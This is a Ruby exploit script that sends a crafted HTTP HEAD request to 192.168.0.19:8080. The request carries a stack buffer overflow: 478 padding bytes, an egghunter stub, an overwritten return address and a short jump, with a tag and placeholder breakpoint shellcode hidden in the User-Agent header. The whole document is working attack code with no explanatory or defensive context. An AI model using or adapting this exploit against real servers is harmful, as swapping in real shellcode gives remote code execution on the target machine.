#!/usr/bin/env ruby

require 'socket'

junk1 = "\x41" * 478
eip = "\xDB\x09\xF2\x76" #Memory Address 76F209DB
shortjmp = "\xeb\xc4"

shellcode = "\xcc"
hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" +
"\xef\xb8\x73\x6f\x70\x61\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

junk2 = "sopasopa" + shellcode

buffer = "HEAD /" + junk1 + hunter + "A" * 5 + eip + shortjmp + " HTTP/1.1\r\n" +
"Host: 192.168.0.19:8080\r\n" +
"User-Agent: " + junk2 + "\r\n" +
"Keep-Alive: 115\r\n" +
"Connection: keep-alive\r\n\r\n"

s = TCPSocket.open("192.168.0.19", 8080)
# s.recv(1024)
s.send(buffer, 0)
s.close